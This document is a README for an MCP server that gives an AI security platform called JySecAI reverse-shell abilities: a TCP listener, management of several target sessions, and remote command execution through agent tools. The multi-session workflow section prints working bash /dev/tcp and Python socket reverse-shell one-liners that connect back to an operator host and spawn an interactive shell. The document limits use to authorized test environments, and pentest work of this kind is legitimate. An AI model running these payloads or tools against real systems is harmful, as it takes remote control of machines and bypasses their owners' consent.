# Reverse Shell MCP

[中文](README_CN.md)

Add **reverse shell** capability to JySecAI via External MCP: start/stop a TCP listener, manage **multiple connected targets (sessions)**, and run commands on a chosen session—no backend code changes required. Sessions are protected by a one-time handshake token and an optional source-IP allowlist.

## Tools

| Tool | Description |
|------|-------------|
| `reverse_shell_start_listener` | Start TCP listener on a given port (multiple targets may connect). Optional `allowed_ips` source-IP whitelist. Returns a one-time **handshake token** that the target must send in its first packet. |
| `reverse_shell_stop_listener` | Stop the listener and disconnect all sessions. |
| `reverse_shell_status` | Show status: listening, port, session count, client address, IP whitelist. |
| `reverse_shell_sessions` | List all sessions: `session_id`, source IP:port, connected time, status, plus recent rejection/disconnect events. |
| `reverse_shell_send_command` | Run a command on one session and return output (capped at 1 MB). `session_id` is optional: auto-selected when exactly one session is connected; with several sessions it must be given, otherwise an error lists the available ids. |
| `reverse_shell_disconnect` | Drop one session (optional `session_id`, auto-selected if only one) without stopping the listener. |

## Multi-session workflow

1. `reverse_shell_start_listener(4444)` — the result includes the handshake token, e.g.:
   `握手 token（一次性，重启监听会更换）: be82bb3c...`
   Restarting the listener generates a fresh token.
2. On the target, connect back and **send the token as the first packet**, then spawn the shell:
   - Linux bash:
     `bash -c 'exec 3<>/dev/tcp/YOUR_IP/4444; echo TOKEN >&3; exec bash -i <&3 >&3 2>&3'`
   - Python:
     `python3 -c "import socket,os,subprocess;s=socket.socket();s.connect(('YOUR_IP',4444));s.sendall(b'TOKEN');[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(['/bin/bash','-i'])"`
   - Any payload works as long as the first bytes on the wire contain the token; anything after the token in that first packet is discarded.
3. `reverse_shell_sessions` lists connected targets with their `session_id`, source IP and connect time.
4. `reverse_shell_send_command("id")` when only one session is connected; otherwise pass `session_id`, e.g. `reverse_shell_send_command("id", session_id="sess-0002")`.
5. `reverse_shell_disconnect(session_id)` drops one target; `reverse_shell_stop_listener` stops everything.

Connections with a wrong/missing token or a non-whitelisted source IP are disconnected immediately and recorded; `reverse_shell_sessions` shows the recent events.

## Source IP allowlist

Pass `allowed_ips` to accept connections only from listed IPs:

```
reverse_shell_start_listener(4444, allowed_ips=["10.0.0.8", "10.0.0.9"])
```

Empty/omitted keeps the old behavior (accept any source). IP entries are validated; invalid entries abort the start.

## Requirements

- Python 3.10+
- `mcp` package (included if using the project venv; otherwise: `pip install mcp`)

## Setup in JySecAI

1. **Paths**  
   Example: project root `/path/to/JySecAI-main`  
   Script: `/path/to/JySecAI-main/mcp-servers/reverse_shell/mcp_reverse_shell.py`

2. **Web UI** → **Settings** → **External MCP** → **Add External MCP**. Paste JSON (replace paths with yours):

```json
{
  "reverse-shell": {
    "command": "/path/to/JySecAI-main/venv/bin/python3",
    "args": ["/path/to/JySecAI-main/mcp-servers/reverse_shell/mcp_reverse_shell.py"],
    "description": "Reverse shell: multi-session listener with token auth, run commands on targets",
    "timeout": 60,
    "external_mcp_enable": true
  }
}
```

   - `command`: Prefer the project **venv** Python; or use system `python3`.
   - `args`: **Must be absolute path** to `mcp_reverse_shell.py`.
   - Save, then click **Start** for this MCP to use the tools in chat.

## Run locally (optional)

```bash
# From project root, with venv
./venv/bin/python mcp-servers/reverse_shell/mcp_reverse_shell.py
```

The process talks MCP over stdio; JySecAI starts it the same way when using External MCP.

## Tests

```bash
python3 mcp-servers/reverse_shell/test_multi_session.py
```

Logic tests for the multi-session channel (handshake token accept/reject, concurrent sessions in the table, per-session `send_command`, auto-select vs. explicit id, 1 MB output cap, IP allowlist, cleanup). If `mcp`/`yaml` are not installed, minimal stubs are injected automatically, so no third-party packages are needed.

## Security

- Use only in authorized, isolated test environments.
- Handshake token: each `start_listener` generates a one-time random token; the target's first packet must contain it or the connection is dropped and logged.
- `allowed_ips`: source-IP whitelist; empty means accept-any (legacy behavior).
- Command output is capped at 1 MB per `send_command` to protect operator memory.
- The listener still binds to `0.0.0.0`; restrict access with firewall or network policy if the port is exposed.
